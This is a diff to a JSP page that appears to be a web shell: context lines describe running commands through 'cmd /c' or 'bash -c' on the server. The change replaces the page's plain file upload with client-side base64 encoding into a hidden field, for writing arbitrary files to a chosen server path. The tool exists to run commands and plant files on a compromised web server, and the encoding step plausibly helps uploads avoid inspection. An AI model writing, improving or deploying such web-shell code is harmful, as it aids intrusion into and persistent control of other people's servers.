@@ -58,9 +58,40 @@ You may want to prefix your command with <code>cmd /c</code> or <code>bash -c</c
 STDERR will automatically be redirected to STDOUT for you. Newlines may be translated by server's local platform.
 </p>
 
-<form action="" method="POST" enctype="multipart/form-data">
-<label>Destination File path and filename:</label><input type="text" name="filepath" size="100" value="<%= clean(System.getProperty("user.dir")) %><%= clean(System.getProperty("file.separator")) %>"/><br />
-<input type="file" name="file" size="100" /><br />
+<script type="text/javascript">
+	function readFile(file) {
+		return new Promise((resolve, reject) => {
+			const reader = new FileReader();
+			
+			reader.onload = res => {
+				resolve(res.target.result);
+			};
+			
+			reader.onerror = err => reject(err);
+			
+			reader.readAsDataURL(file);
+		})
+	}
+
+	async function convertBase64() {
+		const file = document.getElementById('file').files[0];
+		
+		const contents = await readFile(file);
+		
+		document.getElementById('base64filecontent').value = contents;
+	}
+	
+	function optimizeSubmit() {
+		// No need to upload the non-base64 file
+		document.getElementById('file').value = document.getElementById('file').defaultValue;
+	}
+
+</script>
+
+<form action="" method="POST" enctype="multipart/form-data" onsubmit="optimizeSubmit()">
+<label>Destination File path and filename:</label><input type="text" name="filepath" id="filepath" size="100" value="<%= clean(System.getProperty("user.dir")) %><%= clean(System.getProperty("file.separator")) %>"/><br />
+<input type="file" name="file" id="file" size="100" onchange="convertBase64()" /><br />
+<input type="hidden" name="base64filecontent" id="base64filecontent" />
 <br />
 <input type="submit" value="Upload"/>
 </form>
